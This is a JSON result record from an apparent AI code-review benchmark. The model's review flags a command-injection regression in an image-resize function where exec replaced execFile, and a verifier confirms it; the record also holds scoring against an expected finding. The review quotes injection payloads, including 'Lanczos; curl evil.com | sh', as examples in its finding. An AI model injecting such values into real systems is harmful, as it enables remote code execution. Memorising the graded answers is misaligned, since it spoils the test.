@@ -1,0 +1,95 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 72.7,
+  "setup_seconds": 0.2,
+  "total_seconds": 72.9,
+  "usage": {
+    "in": 19555,
+    "cache_read": 102400,
+    "cache_write": 0,
+    "out": 3968,
+    "source": "cli"
+  },
+  "cost_usd": 0.114118,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "Switching from `execFile` to `exec` interpolates caller-controlled `filter` (unquoted) and `src` (double-quoted only) into a shell. A filter such as `Lanczos; curl evil.com | sh` or a path containing `\"` is executed by the shell; ImageMagick `-filter` is a single argv token and does not need a shell.\n\nKeep `execFile` and pass the filter as an argument:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso restore `import { execFile } from \"child_process\";`."
+    }
+  ],
+  "summary": "Looks good except for a critical command-injection regression: `resize` now builds a shell string from caller-supplied `filter` and `src`.\n\nThe previous `execFile` argv form already supports ImageMagick `-filter` as one argument, so a shell is not required for composed filter names. Interpolating `filter` unquoted (and `src` only double-quoted) means values such as `Lanczos; id` or a path containing `\"` run as shell on the host. Restore `execFile` and pass `-filter` plus the filter string as argv entries.\n\nThe new required middle parameter also shifts the old `resize(src, w)` contract; any existing caller will treat the width as the filter and pass `undefined` into `-resize`. There are no in-repo callers to update.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces execFile argv passing with exec and interpolates unquoted filter plus only double-quoted src into a shell command, enabling command injection; base used execFile safely and ImageMagick -filter does not require a shell."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 12.389,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2764,
+      "out": 387
+    },
+    "cost_usd": 0.008772
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
